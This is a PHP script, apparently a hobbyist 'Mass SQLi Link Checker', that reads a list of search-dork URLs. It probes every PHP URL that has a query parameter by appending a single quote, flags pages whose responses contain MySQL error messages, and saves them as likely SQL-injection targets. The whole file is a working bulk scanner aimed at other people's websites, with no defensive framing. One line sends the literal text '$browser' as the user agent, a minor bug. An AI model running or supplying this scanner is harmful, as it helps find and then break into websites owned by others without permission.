<?php
$vuln = array();
$php = array();
$vulntest = array();
$browser = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0';
$dorklist = file_get_contents('1.txt');
$urls = explode("\r\n", $dorklist);
sort($urls);
foreach($urls as $url){
    if(preg_match("#\.php#", $url) && preg_match("#\=#", $url)){
        $php[] = $url;
    }
}
foreach($php as $url){
    if(preg_match("#viewtopic.php#", $url)){
        
    } else {
        $vulntest[] = $url;
    }
}
echo "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_\n";
echo "|        Mass SQLi Link Checker         |\n";
echo "|               By Furry~               |\n";
echo "-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n";
foreach($vulntest as $url){
    $curl = curl_init($url."'");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_USERAGENT, '$browser');
    curl_setopt($curl, CURLOPT_TIMEOUT, 5);
    $result = curl_exec($curl);
    if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$result)) {
        echo $url." Might be SQLi vulnerable\n";
        $fh = fopen('possiblevulns.txt', 'a') or die("can't open file");
        fwrite($fh, "\n".$url);
    } else {
        echo $url." Is not SQLi vulnerable\n";
    }
}
?>